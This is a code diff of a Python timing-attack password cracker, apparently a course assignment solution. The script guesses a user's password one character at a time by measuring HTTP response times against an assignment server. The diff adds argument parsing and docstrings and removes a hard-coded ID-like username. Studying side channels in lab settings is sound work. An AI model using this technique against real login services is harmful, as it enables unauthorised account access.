@@ -1,14 +1,14 @@
 import requests
 import time
 import statistics
-from typing import List, Dict, Tuple
+from typing import List, Dict
 import sys
 from string import ascii_lowercase
-import numpy as np
 from collections import defaultdict
 
 
 class PasswordCracker:
+    """A class to crack passwords using timing analysis and response checking."""
     def __init__(self, base_url: str = "http://127.0.0.1"):
         self.base_url = base_url
         self.charset = ascii_lowercase
@@ -22,21 +22,23 @@ class PasswordCracker:
         try:
             self.session.get(warmup_url)
             time.sleep(0.1)  # Small delay after warmup
-        except:
+        except Exception as e:
             pass
 
     def measure_response_time(self, username: str, password: str, difficulty: int = 1,
                               num_samples: int = 10) -> List[float]:
+        """Measure the response time for a given password attempt multiple times. Includes retries for reliability."""
         times: List[float] = []
         url = f"{self.base_url}/?user={username}&password={password}&difficulty={difficulty}"
+        baseline_url = f"{self.base_url}/?user={username}&password={'x' * len(password)}&difficulty={difficulty}"
 
         for i in range(num_samples):
             print(f"Measuring response time for password: {password}, sample no. {i+1}", file=sys.stderr, flush=True)
             try:
                 start_time = time.perf_counter()
                 self.session.get(url)
-                elapsed = time.perf_counter() - start_time
-                times.append(elapsed)
+                actual_time = time.perf_counter() - start_time
+                times.append(actual_time)
             except:
                 self.session = requests.Session()
                 self._warmup_connection()
@@ -48,9 +50,7 @@ class PasswordCracker:
         return times
 
     def check_password(self, username: str, password: str, difficulty: int = 1) -> bool:
-        """
-        Check if a password is correct by looking at the server response.
-        """
+        """Check if a password is correct by looking at the server response."""
         url = f"{self.base_url}/?user={username}&password={password}&difficulty={difficulty}"
         response = self.session.get(url)
         return response.text.strip() == "1"
@@ -66,13 +66,12 @@ class PasswordCracker:
             times = self.measure_response_time(username, test_password, difficulty, num_samples=6)
             length_times[length] = times
 
-        # Find length with most distinct timing pattern
+        # Find length with the highest mean response time
         best_length = max(length_times.items(), key=lambda x: statistics.mean(x[1]))[0]
         return best_length
 
     def analyze_times_mean(self, times: List[float]) -> float:
         """Analyze timing distribution using mean."""
-
         return statistics.mean(times)
 
     def crack_position(self, username: str, current_password: List[str],
@@ -95,7 +94,7 @@ class PasswordCracker:
 
         # For all other positions, use timing analysis
         char_scores: Dict[str, float] = defaultdict(float)
-        samples_per_char = 4
+        samples_per_char = difficulty * 4
 
         for char in self.charset:
             current_password[position] = char
@@ -106,9 +105,7 @@ class PasswordCracker:
             score = self.analyze_times_mean(times)
             char_scores[char] = score
 
-        print(f"Character scores at position {position + 1}: {char_scores}",
-              file=sys.stderr, flush=True)
-
+        # Return the character with the highest mean response time
         return max(char_scores.items(), key=lambda x: x[1])[0]
 
     def crack_password(self, username: str, difficulty: int = 1) -> str:
@@ -130,13 +127,20 @@ class PasswordCracker:
 
 
 def main():
-    username = "316061456"
-    difficulty = 1
-    base_url = "http://aoi-assignment1.oy.ne.ro:8080"
-    cracker = PasswordCracker(base_url)
-    password = cracker.crack_password(username, difficulty)
-    print(password)
+    if len(sys.argv) < 2:
+        print("Usage: python3 ex01_M1.py username [difficulty]", file=sys.stderr)
+        sys.exit(1)
 
+    username = sys.argv[1]
+    # Set difficulty to 1 by default
+    difficulty = int(sys.argv[2]) if len(sys.argv) > 2 else 1
+    base_url = "http://aoi-assignment1.oy.ne.ro:8080"
+    try:
+        cracker = PasswordCracker(base_url)
+        password = cracker.crack_password(username, difficulty)
+        print(password)
+    except Exception as e:
+        print("There has been an error: ", e, file=sys.stderr)
 
 if __name__ == "__main__":
     main()
